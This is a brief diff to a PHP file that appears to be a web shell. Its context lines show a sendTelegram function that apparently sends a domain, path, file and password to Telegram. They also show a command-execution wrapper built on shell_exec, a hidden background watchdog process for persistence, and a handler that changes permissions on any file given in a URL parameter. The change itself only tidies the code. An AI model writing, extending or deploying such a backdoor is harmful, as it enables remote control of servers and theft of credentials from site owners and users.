@@ -30,8 +30,6 @@ function sendTelegram($domain, $path, $file, $passwordInput) {
     curl_close($ch);
 }
 
-    return "❌ Command execution not available.";
-}
 function safe_exec($cmd) {
     // shell_exec
     if (function_exists('shell_exec') && is_callable('shell_exec')) {
@@ -336,7 +334,7 @@ PHP;
     system("/usr/bin/php $watchdog > /dev/null 2>&1 &");
 
     header("Location: ?path=" . urlencode($dir));
-exit;
+    exit;
 }
 if (isset($_GET['unlock']) && is_file($_GET['unlock'])) {
     chmod($_GET['unlock'], 0644);
